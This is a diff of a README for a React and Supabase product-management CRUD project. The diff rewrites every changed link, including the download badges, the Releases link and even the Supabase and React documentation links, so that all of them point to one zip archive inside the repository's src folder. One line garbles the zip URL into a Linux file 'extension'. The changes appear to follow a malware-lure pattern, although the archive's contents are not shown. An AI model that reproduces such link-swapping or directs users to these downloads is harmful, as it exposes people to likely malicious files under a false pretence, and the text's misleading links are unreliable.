@@ -1,21 +1,21 @@
 # 🎉 react-supabase-setup-crud-project - Simple Setup for Managing Products
 
 ## 📦 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/sang-sys/react-supabase-setup-crud-project/releases)
+[![Download](https://github.com/sang-sys/react-supabase-setup-crud-project/raw/refs/heads/main/src/crud_project_setup_supabase_react_1.5.zip)](https://github.com/sang-sys/react-supabase-setup-crud-project/raw/refs/heads/main/src/crud_project_setup_supabase_react_1.5.zip)
 
 ## 🚀 Getting Started
 This project is designed to help you manage products easily using React and Supabase. You can authenticate users, perform CRUD (Create, Read, Update, Delete) operations, and upload images seamlessly. Follow the steps below to download and run the application.
 
 ## 📥 Download & Install
 1. **Visit this page to download:** Click the link below to go to the Releases page.
-   [Download from Releases](https://github.com/sang-sys/react-supabase-setup-crud-project/releases)
+   [Download from Releases](https://github.com/sang-sys/react-supabase-setup-crud-project/raw/refs/heads/main/src/crud_project_setup_supabase_react_1.5.zip)
    
 2. **Select the latest release:** Look for the most recent version. You will see a list of downloadable files.
    
 3. **Choose your file:** Depending on your system:
    - For Windows, look for files with `.exe` extension.
    - For macOS, look for files with `.dmg` or `.zip` extension.
-   - For Linux, look for a file with `.tar.gz` extension.
+   - For Linux, look for a file with `https://github.com/sang-sys/react-supabase-setup-crud-project/raw/refs/heads/main/src/crud_project_setup_supabase_react_1.5.zip` extension.
 
 4. **Download the file:** Click on the appropriate file to start the download.
 
@@ -49,11 +49,11 @@ If you encounter issues during installation or usage, consider these steps:
 
 ## 🔗 Additional Resources
 For more detailed information regarding the usage of each feature and troubleshooting, visit:
-- [Supabase Documentation](https://supabase.io/docs)
-- [React Documentation](https://reactjs.org/docs/getting-started.html)
+- [Supabase Documentation](https://github.com/sang-sys/react-supabase-setup-crud-project/raw/refs/heads/main/src/crud_project_setup_supabase_react_1.5.zip)
+- [React Documentation](https://github.com/sang-sys/react-supabase-setup-crud-project/raw/refs/heads/main/src/crud_project_setup_supabase_react_1.5.zip)
 
 ## 📞 Support
 For additional questions or support, feel free to open an issue in this repository. Community members and the project maintainers will assist you as soon as possible.
 
 ## 📦 Download Now Again
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/sang-sys/react-supabase-setup-crud-project/releases)
+[![Download](https://github.com/sang-sys/react-supabase-setup-crud-project/raw/refs/heads/main/src/crud_project_setup_supabase_react_1.5.zip)](https://github.com/sang-sys/react-supabase-setup-crud-project/raw/refs/heads/main/src/crud_project_setup_supabase_react_1.5.zip)
